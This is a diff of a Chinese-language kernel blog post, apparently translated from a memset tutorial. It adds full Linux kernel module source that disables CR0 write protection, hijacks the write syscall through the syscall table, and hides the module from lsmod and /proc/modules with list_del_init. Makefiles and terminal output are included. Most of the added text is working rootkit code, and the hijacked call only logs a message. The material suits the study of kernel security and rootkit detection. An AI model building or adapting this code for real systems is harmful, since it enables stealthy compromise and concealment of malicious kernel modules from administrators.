@@ -189,8 +189,8 @@ tags: [kernel]
 所以我们把这个标志位设置为0就可以读写内存页面了(包括系统调用表).内核里提供了如下函数修改CR0
 
 
-#define read_cr0 () (native_read_cr0 ())
-#define write_cr0 (x) (native_write_cr0 (x))
+    #define read_cr0 () (native_read_cr0 ())
+    #define write_cr0 (x) (native_write_cr0 (x))
 
 这两个native read/write函数的定义如下:
 
@@ -207,3 +207,191 @@ tags: [kernel]
 	}
 
 "read_cr0"函数返回寄存器CR0的值,"write_cr0"函数设置这个寄存器的值.
+
+所以我们可以通过一下的方式来开启/关闭保护模式.
+
+
+	/* disable protected mode
+	 
+	   I perform a not operation to 0x10000 ( so I have 0x01111). 
+	   Later I perform an AND operation between the current value 
+	   of the CR0 register and 0x01111. So the WP bit is set to 0 
+	   and the protected mode is disabled.
+	 
+	*/
+	 
+	write_cr0 (read_cr0 () & (~ 0x10000));
+	 
+	/* enable protected mode
+	 
+	   I perform an OR operation between the current value of 
+	   the CR0 register and 0x10000. So the WP bit is set to 1 
+	   and the protected mode is enabled.
+	    
+	*/
+	    
+	write_cr0 (read_cr0 () | 0x10000);
+
+修改过的源码.(hijack2.c)
+
+	#include <linux/init.h>
+	#include <linux/module.h>
+	#include <linux/kernel.h> 
+	#include <linux/errno.h> 
+	#include <linux/types.h>
+	#include <linux/unistd.h>
+	#include <asm/cacheflush.h>  
+	#include <asm/page.h>  
+	#include <asm/current.h>
+	#include <linux/sched.h>
+	#include <linux/kallsyms.h>
+	 
+	unsigned long *syscall_table = (unsigned long *)0xc05d2180; 
+	 
+	asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
+	 
+	asmlinkage int new_write(unsigned int fd, const char __user *buf, size_t count) {
+	 
+	    // hijacked write
+	 
+	    printk(KERN_ALERT "WRITE HIJACKED");
+	 
+	    return (*original_write)(fd, buf, count);
+	}
+	 
+	static int init(void) {
+	 
+	    printk(KERN_ALERT "\nHIJACK INIT\n");
+	 
+	    write_cr0 (read_cr0 () & (~ 0x10000));
+	 
+	    original_write = (void *)syscall_table[__NR_write];
+	    syscall_table[__NR_write] = new_write;  
+	 
+	    write_cr0 (read_cr0 () | 0x10000);
+	 
+	    return 0;
+	}
+	 
+	static void exit(void) {
+	 
+	    write_cr0 (read_cr0 () & (~ 0x10000));
+	 
+	    syscall_table[__NR_write] = original_write;  
+	 
+	    write_cr0 (read_cr0 () | 0x10000);
+	     
+	    printk(KERN_ALERT "MODULE EXIT\n");
+	 
+	    return;
+	}
+	 
+	module_init(init);
+	module_exit(exit);
+
+Makefile:
+
+	obj-m   := hijack2.o
+	 
+	KDIR    := /lib/modules/$(shell uname -r)/build
+	PWD    := $(shell pwd)
+	 
+	default:
+	    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
+
+现在加载我们的模块就不吹出错了.
+
+	spaccio@spaccio-laptop:~$ sudo insmod hijack2
+	spaccio@spaccio-laptop:~$
+
+## 隐藏内核模块 ##
+
+隐藏我们的模块很简单.把它从模块列表中去掉就可以了.(lsmod 和/proc/modules).
+下面是源代码:
+
+	#include <linux/init.h>
+	#include <linux/module.h>
+	#include <linux/kernel.h> 
+	#include <linux/errno.h> 
+	#include <linux/types.h>
+	#include <linux/unistd.h>
+	#include <asm/cacheflush.h>  
+	#include <asm/page.h>  
+	#include <asm/current.h>
+	#include <linux/sched.h>
+	#include <linux/kallsyms.h>
+	 
+	 
+	static int init(void) {
+	 
+	    list_del_init(&__this_module.list);
+	 
+	    return 0;
+	}
+	 
+	static void exit(void) {
+	 
+	    return;
+	}
+	 
+	module_init(init);
+	module_exit(exit);
+
+Makefile:
+
+	obj-m   := hijack3.o
+	
+	KDIR    := /lib/modules/$(shell uname -r)/build
+	PWD    := $(shell pwd)
+	
+	default:
+    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
+
+现在使用lsmod命令就看不到我们的模块了.
+
+	spaccio@spaccio-laptop:~$ sudo insmod hijack3
+	spaccio@spaccio-laptop:~$ lsmod
+	Module                  Size  Used by
+	kernel_redir            2200  1 
+	aes_i586                7280  2 
+	aes_generic            26875  1 aes_i586
+	rfcomm                 33811  6 
+	binfmt_misc             6599  1 
+	sco                     7998  2 
+	bnep                    9542  2 
+	l2cap                  37008  16 rfcomm,bnep
+	vboxnetadp              6454  0 
+	vboxnetflt             15216  0 
+	...
+	spaccio@spaccio-laptop:~$ lsmod |grep hijack3.ko
+	spaccio@spaccio-laptop:~$
+
+这一切都要归功于"list_del_init()"函数.这个函数是这样定义的:
+
+	static inline void list_del_init (struct list_head * entry)
+	{
+    __list_del (entry->prev, entry->next);
+    INIT_LIST_HEAD (entry);
+	}
+
+"__list_del()"和"INIT_LIST_HEAD()"函数定义如下:
+
+	static inline void __list_del (struct list_head * prev, struct list_head * next)
+	{
+	     next-> prev = prev;
+	     prev-> next = next;
+	}
+	 
+	static inline void INIT_LIST_HEAD (struct list_head * list)
+	{
+	     list-> next = list;
+	     list-> prev = list;
+	}
+
+所以 "list_del_init()"函数把我们模块的名字从管理模块列表的双向链表中删掉了.这样我们用lsmod命令(或者在/proc/modules文件中)就看不到这个模块了.
+
+
+
+## 参考资料 ##
+
+[memset](http://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/)
